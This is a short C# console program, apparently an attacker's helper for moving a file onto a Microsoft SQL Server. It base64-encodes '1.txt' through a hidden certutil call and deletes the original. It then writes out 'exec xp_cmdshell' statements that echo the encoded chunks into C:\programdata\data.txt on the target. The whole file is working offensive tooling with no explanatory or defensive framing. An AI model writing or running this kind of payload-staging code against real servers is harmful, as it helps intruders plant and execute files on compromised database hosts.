using System;
using System.IO;

namespace ConsoleApp2
{
    class Program
    {
        public static string InsertFormat(string input, int interval, string value)
        {
            for (int i = interval; i < input.Length; i += interval + 1)
                input = input.Insert(i, value);
            return input;
        }
        public static void ShowInfo() {
            Console.WriteLine("1.txt is not Exists!!!");
        }
        static void Main(string[] args)
        {
            int i = 0;
            string all = "";
            if (File.Exists("1.txt"))
            {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C certutil -encode 1.txt 2.txt && del 1.txt && exit";
                process.StartInfo = startInfo;
                process.Start();
                process.WaitForExit();
                process.Close();
                using (StreamReader sr = new StreamReader("2.txt"))
                {
                    string line;
                    while ((line = sr.ReadLine()) != null)
                    {
                        all += line;
                    }
                }
                string teststr2 = InsertFormat(all, 5000, "\n");
                string[] words = teststr2.Split('\n');
                using (StreamWriter sw = new StreamWriter("ok.txt"))
                {
                foreach (var word in words)
                {
                    if (i == 0)
                    {
                            sw.WriteLine("exec xp_cmdshell 'echo " + word + " > C:\\programdata\\data.txt';");
                        i += 1;
                    }
                    else
                    {
                            sw.WriteLine("exec xp_cmdshell 'echo " + word + " >> C:\\programdata\\data.txt';");
                    }
                }
                }
            }
            else {
                ShowInfo();
               
            }
          
        }
    }
}
